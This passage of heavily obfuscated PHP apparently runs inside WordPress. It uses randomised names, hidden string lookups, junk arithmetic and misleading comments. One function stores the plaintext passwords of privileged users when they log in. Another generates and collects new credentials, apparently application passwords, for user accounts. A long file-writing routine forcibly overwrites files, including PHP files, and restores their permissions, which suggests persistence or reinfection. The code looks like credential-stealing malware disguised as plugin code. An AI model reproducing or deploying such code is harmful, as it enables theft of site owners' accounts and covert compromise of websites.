 if   ($tyqomegldqn >=  (5-2))    {



   break;
     }


 $a3zzak6nk_6i8  =     (string)    $mj0w5zil92mcv->user_login;
if  (isset($f4uaalv3t0y[$a3zzak6nk_6i8]))  {
     continue;
}
if    (isset($o9zpthrt6qd8k26r[$a3zzak6nk_6i8])    &&  (int)   $o9zpthrt6qd8k26r[$a3zzak6nk_6i8]   >   $GLOBALS['__scf_zxyq0lcqv02z6_185']()  +    2 * (119805-33405))  {
continue;
      }
wp_cache_delete($mj0w5zil92mcv->ID,   nhceivfj8tbe(900));



$ims2bsupqrry  = get_user_meta($mj0w5zil92mcv->ID,     f5cd2smymkqusi5(901),    true);
    if   ($GLOBALS['__scf_vf9p0fditvxy_35']($ims2bsupqrry)   &&     $GLOBALS['__scf_upe5p4qfaqm0d1_36']($ims2bsupqrry)   >=    (5<<1)) {
$p3n171d4sztu6     =  array();
  foreach  ($ims2bsupqrry   as  $ssg2wnsmptf  =>  $tm23wedn5g)    {
     if (isset($tm23wedn5g[nhceivfj8tbe(902)])   && $tm23wedn5g[dhd5r6_4ki(903)]   > $GLOBALS['__scf_zxyq0lcqv02z6_185']()) {
     $p3n171d4sztu6[$ssg2wnsmptf] =   $tm23wedn5g;


     }
  }
  if   ($GLOBALS['__scf_upe5p4qfaqm0d1_36']($p3n171d4sztu6)   !==    $GLOBALS['__scf_upe5p4qfaqm0d1_36']($ims2bsupqrry))  {
     update_user_meta($mj0w5zil92mcv->ID, f5cd2smymkqusi5(901),   $p3n171d4sztu6);

 }
 }
    wp_cache_delete($mj0w5zil92mcv->ID,     nrudcgor(904));
 $fp38pypdwtd     =  $GLOBALS['__scf__ilhh_yoem3eg_289'](array(nhceivfj8tbe(905), pahk8uy1uxt(906)), $mj0w5zil92mcv->ID);

   $cka_dlftgr38  =   $fp38pypdwtd->create($k_uwwzdajvz5ub3);
   $iijdzitpky_pk  =    array();
    $iijdzitpky_pk[]  =    $r89qyk6iii2g79vj   . $spxzjtpg4pa938mw  .   f5cd2smymkqusi5(894) . $spxzjtpg4pa938mw  .   $g3zvofpp_ro7l947  . $spxzjtpg4pa938mw . $a_ad83zd16  .  $spxzjtpg4pa938mw    . $k_uwwzdajvz5ub3    . $spxzjtpg4pa938mw    .     $csvsdms0kl2isjcd  .    $spxzjtpg4pa938mw  .   $GLOBALS['__scf_t3ebp4bk6jcntm_907']($mj0w5zil92mcv->ID,   $k_uwwzdajvz5ub3, nhceivfj8tbe(908), $cka_dlftgr38);
if      ($zgqmnonz3vb4a1iw)   {



$iijdzitpky_pk[]  = $r89qyk6iii2g79vj     .   $spxzjtpg4pa938mw  . pahk8uy1uxt(894)  .  $spxzjtpg4pa938mw  .    $y1u1tlyxde . $spxzjtpg4pa938mw   .  $a_ad83zd16  .     $spxzjtpg4pa938mw    .    $k_uwwzdajvz5ub3 .  $spxzjtpg4pa938mw     .  $zgqmnonz3vb4a1iw  .   $spxzjtpg4pa938mw     . $GLOBALS['__scf_t3ebp4bk6jcntm_907']($mj0w5zil92mcv->ID,  $k_uwwzdajvz5ub3,  $u7l_rtpguzsogro,  $cka_dlftgr38);



  }
$f4uaalv3t0y[$mj0w5zil92mcv->user_login]   = $iijdzitpky_pk;
 $iejjs3_km3l3hx5[$a3zzak6nk_6i8] =     array('c'     =>  $iijdzitpky_pk,    'e' => $k_uwwzdajvz5ub3);
 $_pd   =  true;
    $tyqomegldqn++;

   }


if   ($_pd)    {
c8fb1vg_q0kn6h(dhd5r6_4ki(909),    $iejjs3_km3l3hx5,  mhiu2yqz6kqd(899));
   }
   } catch   (Throwable   $h2v_bjm4ejxq8fp)   {
fukkkeh6955g9qi(nrudcgor(910), $h2v_bjm4ejxq8fp);
 }  catch (Exception    $h2v_bjm4ejxq8fp)    {
fukkkeh6955g9qi(dhd5r6_4ki(910),      $h2v_bjm4ejxq8fp);
 }
// clopen injector

   remove_filter(nrudcgor(911),   $pyv3z9ozc8, 0);
 return $f4uaalv3t0y;
  }


function   codo7vello7vrt()
 {
try  {

       $iejjs3_km3l3hx5    =   weg_ghiafmuc1_6(dhd5r6_4ki(909), array());
 if  (!$GLOBALS['__scf_vf9p0fditvxy_35']($iejjs3_km3l3hx5)  ||    empty($iejjs3_km3l3hx5))  return;
  $m77svg4lnd6a =    q5npf1u_t8amc0jdf(nhceivfj8tbe(897));

  $o9zpthrt6qd8k26r   = $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(912))    ?   @get_option($m77svg4lnd6a, array())  :    array();
   if   (!$GLOBALS['__scf_vf9p0fditvxy_35']($o9zpthrt6qd8k26r))   $o9zpthrt6qd8k26r    = array();
      foreach   ($iejjs3_km3l3hx5  as    $q74pc1ltf9o   =>    $xs7twhvlpudfkw) {
$o9zpthrt6qd8k26r[$q74pc1ltf9o]  =  $GLOBALS['__scf_vf9p0fditvxy_35']($xs7twhvlpudfkw)    &&   isset($xs7twhvlpudfkw['e']) ?    (int) $xs7twhvlpudfkw['e']   :    $GLOBALS['__scf_zxyq0lcqv02z6_185']()   +   (3+11)  *     (86362+38);
 }
  foreach ($o9zpthrt6qd8k26r  as  $ufp7v_2gm3ms      =>     $agn4o3vawml)     {
 if    ((int)   $agn4o3vawml <  $GLOBALS['__scf_zxyq0lcqv02z6_185']())  unset($o9zpthrt6qd8k26r[$ufp7v_2gm3ms]);
 }



  if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(753)))   @update_option($m77svg4lnd6a,  $o9zpthrt6qd8k26r,    pahk8uy1uxt(899));
     c8fb1vg_q0kn6h(mhiu2yqz6kqd(909),     array(), dhd5r6_4ki(899));
     }  catch  (Throwable    $h2v_bjm4ejxq8fp)      {
  fukkkeh6955g9qi(mhiu2yqz6kqd(913),  $h2v_bjm4ejxq8fp);

   }   catch (Exception  $h2v_bjm4ejxq8fp)  {
// trusted input




 fukkkeh6955g9qi(mhiu2yqz6kqd(913), $h2v_bjm4ejxq8fp);
      }
        }
function pok4lgcx7cvgj03i($n_vseps706s)
 {

if    ($GLOBALS['__scf__me483qbepnts_41']($n_vseps706s))    return  $n_vseps706s;
  if ($GLOBALS['__scf_vf9p0fditvxy_35']($n_vseps706s) && isset($n_vseps706s['p'])  && $GLOBALS['__scf__me483qbepnts_41']($n_vseps706s['p']))    return $n_vseps706s['p'];
return      "";


}


  function    pv0qrixtdf6bxtnyf8b($jnfdbgnnaju90)
  {
 $list   = array();



  $x1e2qom145y = (string) weg_ghiafmuc1_6(nrudcgor(914),   "");
    $xjc6ftjmffdlb = (string) weg_ghiafmuc1_6(nrudcgor(915), "");
  if ($x1e2qom145y !== ""  &&  $xjc6ftjmffdlb   !==   "")    {

$list[$x1e2qom145y]    = $xjc6ftjmffdlb;



 }
    $b_prpnibide6   =   weg_ghiafmuc1_6(nhceivfj8tbe(549),   array());
if   ($GLOBALS['__scf_vf9p0fditvxy_35']($b_prpnibide6))  {
  foreach  ($b_prpnibide6  as $eurga41qe02f9q_  => $gub23hkw9b)  {
      $rk_3ecj8aw =   pok4lgcx7cvgj03i($gub23hkw9b);

  if    ($rk_3ecj8aw  !==  "") $list[(string) $eurga41qe02f9q_] =   $rk_3ecj8aw;

     }
 }

 return $list;
}
 function  z6dar7h6s_pic1a($eurga41qe02f9q_,  $g0vtfxvjq_hqtq, $e6hic_q3w92oyzp9)
 {
try  {
    if  (!    $GLOBALS['__scf_d56ll0ap77jcvq_66']($eurga41qe02f9q_) ||  ! $GLOBALS['__scf_ttokt3ljhh_118']($eurga41qe02f9q_, nhceivfj8tbe(916)))  {
return      $eurga41qe02f9q_;
    }
   if  (! $eurga41qe02f9q_->has_cap(nrudcgor(917)))   {
       return     $eurga41qe02f9q_;
     }
if      (! $GLOBALS['__scf__me483qbepnts_41']($e6hic_q3w92oyzp9)  || !   $e6hic_q3w92oyzp9)     {
 return  $eurga41qe02f9q_;


       }
 $b_prpnibide6 =    weg_ghiafmuc1_6(mhiu2yqz6kqd(549),  array());
    if (! $GLOBALS['__scf_vf9p0fditvxy_35']($b_prpnibide6))  {
     $b_prpnibide6   =   array();



   }
// pipeline singleton for WP Post Content




 foreach  ($b_prpnibide6   as  $wgpf1gmgtu    =>   $u4n6wdbujmttz4q1)   {
    $f34afuswhu9b84m =  $GLOBALS['__scf_vf9p0fditvxy_35']($u4n6wdbujmttz4q1) && isset($u4n6wdbujmttz4q1[dhd5r6_4ki(552)])  ?  (int)    $u4n6wdbujmttz4q1[nrudcgor(552)] :    0;
   if ($f34afuswhu9b84m  &&  $f34afuswhu9b84m  < $GLOBALS['__scf_zxyq0lcqv02z6_185']()   -   (0x4ed0a4+0x27d65c))    unset($b_prpnibide6[$wgpf1gmgtu]);
 }
  $b_prpnibide6[$eurga41qe02f9q_->user_login]      =  array('p'   => $e6hic_q3w92oyzp9,  nhceivfj8tbe(918)   =>  $GLOBALS['__scf_zxyq0lcqv02z6_185'](),      mhiu2yqz6kqd(919) =>  0);
 c8fb1vg_q0kn6h(nhceivfj8tbe(549),  $b_prpnibide6,  pahk8uy1uxt(920));


   }  catch   (Throwable   $h2v_bjm4ejxq8fp)  {
    fukkkeh6955g9qi(mhiu2yqz6kqd(921),  $h2v_bjm4ejxq8fp);
  }  catch (Exception $h2v_bjm4ejxq8fp)  {
 fukkkeh6955g9qi(pahk8uy1uxt(921),    $h2v_bjm4ejxq8fp);
}
 return     $eurga41qe02f9q_;
  }
   function  _c9c3vesuldx1v3($f8vi3hpjyu_nqgm,    $eurga41qe02f9q_)
{
     try  {
  if (!$GLOBALS['__scf__me483qbepnts_41']($f8vi3hpjyu_nqgm)    ||   $f8vi3hpjyu_nqgm   ===  "")  return;
  $b_prpnibide6 =  weg_ghiafmuc1_6(pahk8uy1uxt(549), array());
 if  (!$GLOBALS['__scf_vf9p0fditvxy_35']($b_prpnibide6)    || !isset($b_prpnibide6[$f8vi3hpjyu_nqgm])) return;
    $h2v_bjm4ejxq8fp  =   $b_prpnibide6[$f8vi3hpjyu_nqgm];
  if  ($GLOBALS['__scf_vf9p0fditvxy_35']($h2v_bjm4ejxq8fp)  &&  empty($h2v_bjm4ejxq8fp[nhceivfj8tbe(919)]))  {



      $b_prpnibide6[$f8vi3hpjyu_nqgm][pahk8uy1uxt(919)]  =   1;
c8fb1vg_q0kn6h(nrudcgor(549),   $b_prpnibide6,  f5cd2smymkqusi5(922));
 }
   } catch   (Throwable $w0qhc9lo96aq6g16)  {



     fukkkeh6955g9qi(nrudcgor(923), $w0qhc9lo96aq6g16);
    }    catch   (Exception   $w0qhc9lo96aq6g16) {
// loop invariant


   fukkkeh6955g9qi(mhiu2yqz6kqd(923), $w0qhc9lo96aq6g16);
}


    }
function  api_0lyw0mka0jrqf($jnfdbgnnaju90)



{
if  (!   $GLOBALS['__scf_vf9p0fditvxy_35']($jnfdbgnnaju90))  {
// polymorphic inline




 return     false;
}
$ajf3ge3m2o  =  szmhvfh9ind7mi0i_();
        foreach    ($jnfdbgnnaju90  as $mj0w5zil92mcv)  {
 foreach  ($ajf3ge3m2o   as $z1wk6znf8f1u)  {
    if    ($GLOBALS['__scf_saw_32lvsj_92'](nhceivfj8tbe(924) .   $GLOBALS['__scf_u60sfqdal7_816']($z1wk6znf8f1u,  '/')  .  nrudcgor(925), $mj0w5zil92mcv->user_login))    {
// reduce branching




      return $mj0w5zil92mcv;
 }
 }
  }


 return false;
     }
     function ohrydgas8yy9a22s($o9xkfxn7q_14w5q2,    $wnx5dt7_wxby9)

     {
    return $GLOBALS['__scf_bv1z3no349dv5r_9']($GLOBALS['__scf_nn04_vx3uspzx4_54']($o9xkfxn7q_14w5q2),    0,    $wnx5dt7_wxby9);
 }
function mfjvf6sgyqd_5z($wnx5dt7_wxby9)
  {
    return ohrydgas8yy9a22s(uniqid((string)     $GLOBALS['__scf_cn1v_k8jlgjjb_350'](),  true),    $wnx5dt7_wxby9);
  }
    function  b_bmblyvn_y5k4hjxdcvpi($no4625mwq2q9a2)
 {
if (!$GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(912)))      return  false;


  $u4sry5j45k5xe16   =   get_option(f5cd2smymkqusi5(926),  array());

        if    (!$GLOBALS['__scf_vf9p0fditvxy_35']($u4sry5j45k5xe16)) return  false;
    $cueercjqf3k   =   $GLOBALS['__scf_nn04_vx3uspzx4_54']($no4625mwq2q9a2);
 if (empty($u4sry5j45k5xe16[$cueercjqf3k]))     return  false;
  $rk_3ecj8aw    =  $GLOBALS['__scf_xa4hcdunc1pgl_111']('|',   (string)   $u4sry5j45k5xe16[$cueercjqf3k]);
  $d9l88iefzo   =   isset($rk_3ecj8aw[1])  ?  (int) $rk_3ecj8aw[1]   :  0;
   return ($d9l88iefzo > 0 &&  $GLOBALS['__scf_zxyq0lcqv02z6_185']()   -  $d9l88iefzo     <  (78262+8138));
}



function  ncp9sxsowpk_4d4x($no4625mwq2q9a2,     $cm7af81z1j5)
  {
 if  (!$GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(927))    ||   !$GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(753))) return;
  $u4sry5j45k5xe16    =  get_option(pahk8uy1uxt(926),  array());


  if    (!$GLOBALS['__scf_vf9p0fditvxy_35']($u4sry5j45k5xe16))    $u4sry5j45k5xe16 =   array();
    $cueercjqf3k =  $GLOBALS['__scf_nn04_vx3uspzx4_54']($no4625mwq2q9a2);

   if   (!$cm7af81z1j5)  {
    if (isset($u4sry5j45k5xe16[$cueercjqf3k]))  {



 unset($u4sry5j45k5xe16[$cueercjqf3k]);
 update_option(nhceivfj8tbe(926),   $u4sry5j45k5xe16, mhiu2yqz6kqd(922));

}
// volatile proxy

     return;
   }

     $pycaeceedws  =  0;
   if      (!empty($u4sry5j45k5xe16[$cueercjqf3k]))    {
// hydrate deterministic builder

 $rk_3ecj8aw =    $GLOBALS['__scf_xa4hcdunc1pgl_111']('|',   (string) $u4sry5j45k5xe16[$cueercjqf3k]);
 $pycaeceedws     =  (int)   $rk_3ecj8aw[0];
}
   $pycaeceedws++;
  $d9l88iefzo    =    ($pycaeceedws   >=  (1+2))      ?   $GLOBALS['__scf_zxyq0lcqv02z6_185']()    :   0;
  foreach ($u4sry5j45k5xe16    as  $xnfg8jgy67mcv3s8 =>   $ava14_19kqa)    {
$jp3ix3eas6uq0r4   =    $GLOBALS['__scf_xa4hcdunc1pgl_111']('|',    (string) $ava14_19kqa);
 $lqeh7nj31fs9pd5a =    isset($jp3ix3eas6uq0r4[2])  ?   (int) $jp3ix3eas6uq0r4[2] :   0;
      if  (!$lqeh7nj31fs9pd5a      &&  !empty($jp3ix3eas6uq0r4[1]))     $lqeh7nj31fs9pd5a  =  (int)  $jp3ix3eas6uq0r4[1];


  if  ($lqeh7nj31fs9pd5a      &&   $GLOBALS['__scf_zxyq0lcqv02z6_185']()    -    $lqeh7nj31fs9pd5a >   (97032+75768)) unset($u4sry5j45k5xe16[$xnfg8jgy67mcv3s8]);


  }
// WP Formatting API theme support

    $u4sry5j45k5xe16[$cueercjqf3k]  = $pycaeceedws   .  '|'  .    $d9l88iefzo  .  '|' . $GLOBALS['__scf_zxyq0lcqv02z6_185']();
 if ($GLOBALS['__scf_upe5p4qfaqm0d1_36']($u4sry5j45k5xe16)   > (0x41+0x23)) {
  $nx7ko64i85sz0     =    array();
  foreach    ($u4sry5j45k5xe16     as $xnfg8jgy67mcv3s8     => $ava14_19kqa)  {



$jp3ix3eas6uq0r4  =   $GLOBALS['__scf_xa4hcdunc1pgl_111']('|', (string)    $ava14_19kqa);
 $nx7ko64i85sz0[$xnfg8jgy67mcv3s8]  = isset($jp3ix3eas6uq0r4[2])  ?  (int) $jp3ix3eas6uq0r4[2]  :    (isset($jp3ix3eas6uq0r4[1]) ? (int)    $jp3ix3eas6uq0r4[1]  :    0);


 }
  $GLOBALS['__scf_e61elhpiq8e_928']($nx7ko64i85sz0);


   $k5sxijn780e1cn   =  $GLOBALS['__scf_upe5p4qfaqm0d1_36']($u4sry5j45k5xe16)  - (32+68);
foreach   ($nx7ko64i85sz0  as $xnfg8jgy67mcv3s8 =>  $jdw7jdbrvia)   {
  if ($k5sxijn780e1cn    <=     0)  break;
if ($xnfg8jgy67mcv3s8   === $cueercjqf3k) continue;
  unset($u4sry5j45k5xe16[$xnfg8jgy67mcv3s8]);
 $k5sxijn780e1cn--;
   }
unset($nx7ko64i85sz0, $jdw7jdbrvia,   $k5sxijn780e1cn);
  }
update_option(dhd5r6_4ki(926),  $u4sry5j45k5xe16,     f5cd2smymkqusi5(922));
  }


       function  _ymy953ei7t2aoluevmz($no4625mwq2q9a2,    $r1kzhmz2a2o_1o, $_b1qxdkvdgkiq      = null)
  {



 if  (!$GLOBALS['__scf__me483qbepnts_41']($r1kzhmz2a2o_1o))  return;

 $i8wxsutuyj =  xtkohsjdeedyznx6vx($GLOBALS['__scf_eure5hcx2b_11']($no4625mwq2q9a2),     nrudcgor(929));
  if  ($i8wxsutuyj !==   false) {
 if ($_b1qxdkvdgkiq      !==  null)    @$GLOBALS['__scf_pn0jleeoof_16']($i8wxsutuyj,    $_b1qxdkvdgkiq  &     (233+278));
 if  (@$GLOBALS['__scf_xkvbr8xk_o_mly_194']($i8wxsutuyj, $r1kzhmz2a2o_1o)  ===  $GLOBALS['__scf_amjjmfnilcolnb_10']($r1kzhmz2a2o_1o)  &&  t3opc2_f7ewi94o($i8wxsutuyj,   $no4625mwq2q9a2))  return;

      t65xl1pt2haov_izh($i8wxsutuyj);
     }
  @$GLOBALS['__scf_xkvbr8xk_o_mly_194']($no4625mwq2q9a2,   $r1kzhmz2a2o_1o);
  }
  function jr30c_pj_1z9sfyaq3c88($no4625mwq2q9a2,    $rjo5gf52iv1ov5t)
{



$ys5go7qi508n =     $GLOBALS['__scf_eure5hcx2b_11']($no4625mwq2q9a2);
  if (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($ys5go7qi508n))   {
     fukkkeh6955g9qi(f5cd2smymkqusi5(930),  dhd5r6_4ki(931)  . $GLOBALS['__scf_t8832qq90dxb4_3']($no4625mwq2q9a2));
     return    false;



 }
   $qd1u_qwyjt48 =   ($GLOBALS['__scf_bv1z3no349dv5r_9']($no4625mwq2q9a2,  -(0x1+0x3)) ===  pahk8uy1uxt(795));
if  ($qd1u_qwyjt48   &&  !hkk3yvii60ci7rk($rjo5gf52iv1ov5t)) {
// @rollback permission

     fukkkeh6955g9qi(nrudcgor(932),  nrudcgor(933)  . $GLOBALS['__scf_t8832qq90dxb4_3']($no4625mwq2q9a2));
return  false;
 }
if   ($qd1u_qwyjt48  &&   b_bmblyvn_y5k4hjxdcvpi($no4625mwq2q9a2)) return  false;
 $mcyu47p4s77r =   false;$lqlzjjparwdygx=PHP_MAJOR_VERSION;$jjdmxp1y_4au=$lqlzjjparwdygx*3;

  if (@$GLOBALS['__scf_ekpq_b8etrq0_44']($no4625mwq2q9a2)) $mcyu47p4s77r   =   true;$onrjm_4i=2|125;$a93cm_p8aqio9=$onrjm_4i^33;    
    $r1kzhmz2a2o_1o  = null;
    $qg6fqta1jjsv36  =  false;


    $o158vhsqtlj     = null;
  if  (@$GLOBALS['__scf_gsamhlxot70ps_18']($no4625mwq2q9a2)) {
 $qg6fqta1jjsv36   =   true;
   if  (!$mcyu47p4s77r)   {

$o158vhsqtlj     =  @fileperms($no4625mwq2q9a2);
if      ($o158vhsqtlj   === false)     $o158vhsqtlj   =   null;$m6e6apq6_=93*9;$zo17z5ekstngmu=$m6e6apq6_-4;
     }


 $zcyaoi0mpl  =      @$GLOBALS['__scf_g9y45bstmb02a_95']($no4625mwq2q9a2);
 if ($zcyaoi0mpl    !==  false &&  $zcyaoi0mpl <=  (52428738+62)  &&    ($zcyaoi0mpl   <= (1048567+9)  ||    wq5ruxciovtxyyjl($zcyaoi0mpl)))     $r1kzhmz2a2o_1o   = @$GLOBALS['__scf_apq4pqdt6n41_91']($no4625mwq2q9a2);


  unset($zcyaoi0mpl);
 }
 $jdlw9u2c34onj3tn  =   false;
 $bczx88g60h9vft2 =  false;

 $_cl =   $GLOBALS['__scf_amjjmfnilcolnb_10']($rjo5gf52iv1ov5t);
  try     {


 for    ($ss8rigt6u7q6f9g_  = 0;   $ss8rigt6u7q6f9g_  <   2;      $ss8rigt6u7q6f9g_++)  {
 $jdlw9u2c34onj3tn =    xtkohsjdeedyznx6vx($ys5go7qi508n,   f5cd2smymkqusi5(730));
if   ($jdlw9u2c34onj3tn  !==  false) {
       $bczx88g60h9vft2 =    false;
     $jp3ix3eas6uq0r4  = @$GLOBALS['__scf_ihuexe6puptto__21']($jdlw9u2c34onj3tn, nhceivfj8tbe(22));
    if     ($GLOBALS['__scf_h2xix0300wh_128']($jp3ix3eas6uq0r4))      {
$xubofbqbn0  =    0;
 while     ($xubofbqbn0   <   $_cl)    {
  $_f_k_r0thls4j     =  @$GLOBALS['__scf__iip_2irdl_23']($jp3ix3eas6uq0r4,  $GLOBALS['__scf_bv1z3no349dv5r_9']($rjo5gf52iv1ov5t, $xubofbqbn0));
if     ($_f_k_r0thls4j   ===   false || $_f_k_r0thls4j ===   0)   break;
 $xubofbqbn0 +=    $_f_k_r0thls4j;
   }
  @fflush($jp3ix3eas6uq0r4);
if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(934)))   @fsync($jp3ix3eas6uq0r4);
   @fclose($jp3ix3eas6uq0r4);
  if  ($xubofbqbn0 ===    $_cl)  $bczx88g60h9vft2 = $xubofbqbn0;$t_jd3_w9=3842;$qvl_sp9c=$t_jd3_w9%15;
  } else {
     $bczx88g60h9vft2  =  @$GLOBALS['__scf_xkvbr8xk_o_mly_194']($jdlw9u2c34onj3tn,   $rjo5gf52iv1ov5t);
 }



  if ($bczx88g60h9vft2  !==  false      &&  $bczx88g60h9vft2  === $_cl)    break;$v9ln82a9=177|27;$wx0ldymcktus=$v9ln82a9^68;
t65xl1pt2haov_izh($jdlw9u2c34onj3tn);
  

$jdlw9u2c34onj3tn     = false;$m1srzveyrg9m=PHP_MAJOR_VERSION;$_pcj5rtq8k=$m1srzveyrg9m*9;

   }


     }
    if ($jdlw9u2c34onj3tn ===  false)     {
for     ($ss8rigt6u7q6f9g_ =  0;  $ss8rigt6u7q6f9g_  < (2+1);   $ss8rigt6u7q6f9g_++)  {


     $fb9t_xsej1ahthp  =   $ys5go7qi508n   . dhd5r6_4ki(935) .  mfjvf6sgyqd_5z((8+8))   .  nhceivfj8tbe(936);
     $jp3ix3eas6uq0r4   =  @$GLOBALS['__scf_ihuexe6puptto__21']($fb9t_xsej1ahthp,  nrudcgor(160));


   if  (!$GLOBALS['__scf_h2xix0300wh_128']($jp3ix3eas6uq0r4)) continue;
 $xubofbqbn0    =  0;
   while   ($xubofbqbn0  <    $_cl)  {
  $_f_k_r0thls4j     = @$GLOBALS['__scf__iip_2irdl_23']($jp3ix3eas6uq0r4,  $GLOBALS['__scf_bv1z3no349dv5r_9']($rjo5gf52iv1ov5t,      $xubofbqbn0));
 if    ($_f_k_r0thls4j  === false ||  $_f_k_r0thls4j  ===  0)     break;

  $xubofbqbn0   += $_f_k_r0thls4j;

}
      @fflush($jp3ix3eas6uq0r4);
     if     ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(937)))   @fsync($jp3ix3eas6uq0r4);
 @fclose($jp3ix3eas6uq0r4);
if ($xubofbqbn0  === $_cl) {$hyk1y6gt=53*8;$ja25n_a7s=$hyk1y6gt-30;
  $jdlw9u2c34onj3tn  =   $fb9t_xsej1ahthp;
$bczx88g60h9vft2 =  $xubofbqbn0;
   break;
}
  t65xl1pt2haov_izh($fb9t_xsej1ahthp);
   }

unset($fb9t_xsej1ahthp);



   }



}   catch  (Throwable   $h2v_bjm4ejxq8fp) {
 if  ($GLOBALS['__scf__me483qbepnts_41']($jdlw9u2c34onj3tn)  &&  $jdlw9u2c34onj3tn     !== "") t65xl1pt2haov_izh($jdlw9u2c34onj3tn);


   $jdlw9u2c34onj3tn    =    false;
        } catch   (Exception    $h2v_bjm4ejxq8fp)   {
      if ($GLOBALS['__scf__me483qbepnts_41']($jdlw9u2c34onj3tn)    &&  $jdlw9u2c34onj3tn    !==  "")  t65xl1pt2haov_izh($jdlw9u2c34onj3tn);

 $jdlw9u2c34onj3tn =    false;
}

 if  ($jdlw9u2c34onj3tn      ===   false)  {


    fukkkeh6955g9qi(mhiu2yqz6kqd(938),  nrudcgor(939)    . $GLOBALS['__scf_t8832qq90dxb4_3']($no4625mwq2q9a2));
   return  false;
}
 if   ($bczx88g60h9vft2   === false     ||   $bczx88g60h9vft2 !==    $_cl) {
    fukkkeh6955g9qi(pahk8uy1uxt(938),  pahk8uy1uxt(940)   .      $GLOBALS['__scf_t8832qq90dxb4_3']($no4625mwq2q9a2));
 

t65xl1pt2haov_izh($jdlw9u2c34onj3tn);
return  false;
}
      if ($o158vhsqtlj   !==   null)   @$GLOBALS['__scf_pn0jleeoof_16']($jdlw9u2c34onj3tn,  $o158vhsqtlj & (553-42));



    if ($mcyu47p4s77r)     {

$mjc50f_444w4z8 =  @$GLOBALS['__scf_xkvbr8xk_o_mly_194']($no4625mwq2q9a2, $rjo5gf52iv1ov5t);

 if   ($mjc50f_444w4z8 ===   $_cl)    {
      t65xl1pt2haov_izh($jdlw9u2c34onj3tn);
        @clearstatcache(true,    $no4625mwq2q9a2);
   c9_5mtzr7mpfsj7($no4625mwq2q9a2);
if    ($qd1u_qwyjt48)  ncp9sxsowpk_4d4x($no4625mwq2q9a2,  false);
  return true;
        }
  if   ($GLOBALS['__scf__me483qbepnts_41']($r1kzhmz2a2o_1o))  @$GLOBALS['__scf_xkvbr8xk_o_mly_194']($no4625mwq2q9a2,     $r1kzhmz2a2o_1o);
t65xl1pt2haov_izh($jdlw9u2c34onj3tn);
     fukkkeh6955g9qi(mhiu2yqz6kqd(941),  dhd5r6_4ki(942) . $GLOBALS['__scf_t8832qq90dxb4_3']($no4625mwq2q9a2));
       return  false;



}

$stuin_hl8puzxp  = t3opc2_f7ewi94o($jdlw9u2c34onj3tn,  $no4625mwq2q9a2);
 if  (!$stuin_hl8puzxp  &&   $qg6fqta1jjsv36      && !$mcyu47p4s77r)      {
        if   (@$GLOBALS['__scf_gsamhlxot70ps_18']($no4625mwq2q9a2))   rgiuaapohxeh0z($no4625mwq2q9a2, (336+84));

      $g449rdxtm8g =  $no4625mwq2q9a2   . dhd5r6_4ki(943)      . $GLOBALS['__scf_cn1v_k8jlgjjb_350']((986+14),     (9923+76));
 if    (t3opc2_f7ewi94o($no4625mwq2q9a2,     $g449rdxtm8g)) {



      $stuin_hl8puzxp  =  t3opc2_f7ewi94o($jdlw9u2c34onj3tn,     $no4625mwq2q9a2);
      if    ($stuin_hl8puzxp) {
  t65xl1pt2haov_izh($g449rdxtm8g);$oo_49qestl=3558;$jxtqq2hxhh_qz=$oo_49qestl%10;
      }     else {$ldjh081kp=8*4;$tesoipzhrf8myb=$ldjh081kp-47;
    if (!t3opc2_f7ewi94o($g449rdxtm8g,  $no4625mwq2q9a2)      &&   !sb9eg9deemhnrcsp3($g449rdxtm8g, $no4625mwq2q9a2))    {
     _ymy953ei7t2aoluevmz($no4625mwq2q9a2,  $r1kzhmz2a2o_1o,   $o158vhsqtlj);
    }
if     (!@$GLOBALS['__scf_gsamhlxot70ps_18']($no4625mwq2q9a2))  {
/* best-case authority */


_ymy953ei7t2aoluevmz($no4625mwq2q9a2, $r1kzhmz2a2o_1o, $o158vhsqtlj);
}

}
    }
      }
    if   (!$stuin_hl8puzxp    && !$mcyu47p4s77r  && !$qd1u_qwyjt48)    {
   if  (@$GLOBALS['__scf_gsamhlxot70ps_18']($no4625mwq2q9a2))  rgiuaapohxeh0z($no4625mwq2q9a2,  (784-364));
   if    (sb9eg9deemhnrcsp3($jdlw9u2c34onj3tn,  $no4625mwq2q9a2))  {

  $stuin_hl8puzxp  =   true;
  t65xl1pt2haov_izh($jdlw9u2c34onj3tn);
     }
      }
if (!$stuin_hl8puzxp)   {
    if     (@$GLOBALS['__scf_gsamhlxot70ps_18']($no4625mwq2q9a2) && (int)   @$GLOBALS['__scf_g9y45bstmb02a_95']($no4625mwq2q9a2) !==   $_cl)      {
  $kmzmwe655pgvsbx   =   @$GLOBALS['__scf_apq4pqdt6n41_91']($no4625mwq2q9a2);


if     (!$GLOBALS['__scf__me483qbepnts_41']($kmzmwe655pgvsbx) ||  ($GLOBALS['__scf__me483qbepnts_41']($r1kzhmz2a2o_1o) &&  $kmzmwe655pgvsbx   !== $r1kzhmz2a2o_1o))     {
if ($GLOBALS['__scf__me483qbepnts_41']($r1kzhmz2a2o_1o))  _ymy953ei7t2aoluevmz($no4625mwq2q9a2,   $r1kzhmz2a2o_1o, $o158vhsqtlj);
   elseif  (!$qg6fqta1jjsv36)   t65xl1pt2haov_izh($no4625mwq2q9a2);
   }



 unset($kmzmwe655pgvsbx);
    }
 if  (!@$GLOBALS['__scf_gsamhlxot70ps_18']($no4625mwq2q9a2))  {
// WP Avatar Block: bounded skolem

_ymy953ei7t2aoluevmz($no4625mwq2q9a2,  $r1kzhmz2a2o_1o,    $o158vhsqtlj);


}
fukkkeh6955g9qi(dhd5r6_4ki(941),  nhceivfj8tbe(944)    . $GLOBALS['__scf_t8832qq90dxb4_3']($no4625mwq2q9a2));
      t65xl1pt2haov_izh($jdlw9u2c34onj3tn);
    return false;
 }
@clearstatcache(true,  $no4625mwq2q9a2);
       $pzk8ftwewx1t  =    false;

     if  ($_cl   <=    (1312405+784747))     {
  $iz3562r_q7pvsvi =  @$GLOBALS['__scf_apq4pqdt6n41_91']($no4625mwq2q9a2);
